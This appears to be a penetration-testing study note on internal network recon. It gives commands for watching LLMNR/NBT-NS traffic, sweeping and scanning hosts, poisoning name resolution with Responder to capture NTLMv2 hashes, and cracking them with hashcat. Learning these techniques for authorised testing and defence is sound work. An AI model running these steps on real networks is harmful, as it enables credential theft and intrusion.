# 01.10 Initial Recon Passive Poisoning

> Run `Responder -A` to map LLMNR/NBT-NS traffic and pick live hosts before flipping to active poisoning.

## Overview

Before poisoning, silently observe LLMNR/NBT-NS traffic with Responder in analyse mode. Confirm live hosts with tcpdump, fping, and nmap before going active. Disable SMB in Responder.conf when relaying instead of capturing.

## Steps

- Passively observe traffic with `sudo tcpdump -i ens224` to see what protocols are in use.
- Run `responder -I ens224 -A` to watch without responding (no hashes captured yet).
- Sweep for live hosts: `fping -asgq 172.16.5.0/23`.
- Detailed scan discovered hosts: `sudo nmap -v -A -iL hosts.txt -oN /home/<USER>/Documents/host-enum`.
- Remove `-A` from Responder to start active poisoning and capture NTLMv2 hashes.
- Disable SMB in `Responder.conf` before relaying.
- Crack captured NTLMv2 hashes: `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`.

## Commands

### tcpdump listen

```bash
sudo tcpdump -i ens224
```

### Responder analyse mode

```bash
sudo responder -I ens224 -A
```

### fping sweep

```bash
fping -asgq 172.16.5.0/23
```

### nmap host scan

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/<USER>/Documents/host-enum
```

### Responder active capture

```bash
sudo responder -I ens224
```

### Crack NTLMv2

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
